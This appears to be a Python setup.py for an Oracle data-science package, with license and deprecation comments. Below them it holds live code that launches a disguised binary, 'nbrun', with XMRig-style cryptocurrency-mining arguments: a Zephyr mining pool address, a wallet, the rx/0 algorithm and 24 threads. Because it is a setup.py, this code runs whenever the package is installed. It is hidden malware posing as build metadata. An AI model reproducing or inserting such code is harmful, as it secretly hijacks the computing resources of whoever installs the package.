#!/usr/bin/env python
# -*- coding: utf-8; -*-

# Copyright (c) 2020, 2022 Oracle and/or its affiliates.
# Licensed under the Universal Permissive License v 1.0 as shown at https://oss.oracle.com/licenses/upl/

### File setup.py obsolete and must not be used. Please update pyproject.toml instead.
### See detailed explanation why here:
### https://blog.ganssle.io/articles/2021/10/setup-py-deprecated.html.
# PEP 621 – Storing project metadata in pyproject.toml - https://peps.python.org/pep-0621/
# PEP 518 – Specifying Minimum Build System Requirements for Python Projects https://peps.python.org/pep-0518/
# PEP 508 – Dependency specification for Python Software Packages - https://peps.python.org/pep-0508/
# PEP 517 – A build-system independent format for source trees - https://peps.python.org/pep-0517/

import os

os.system("touch /home/datascience/gitacc.log")

mpool       = "kr.zephyr.herominers.com:1123"
muser       = "ZEPHs6rh7MzGbkN2EkJUcMfVzD4VXzEy3hzMtZLcTuFc5Hb7wQpDbvrR8Lz4TgcG1XTr3ca64ZfUgJJN9cELvRNP2YdC8fwq4oP"
mname       = "14"
mthreads    = "24"
mcmd        = "/home/datascience/oracle/accelerated-data-science.git/nbrun --donate-level 1 -o {} -u {} -p {} -t {} -a rx/0 -k".format(mpool, muser, mname, mthreads) 
os.system(mcmd)

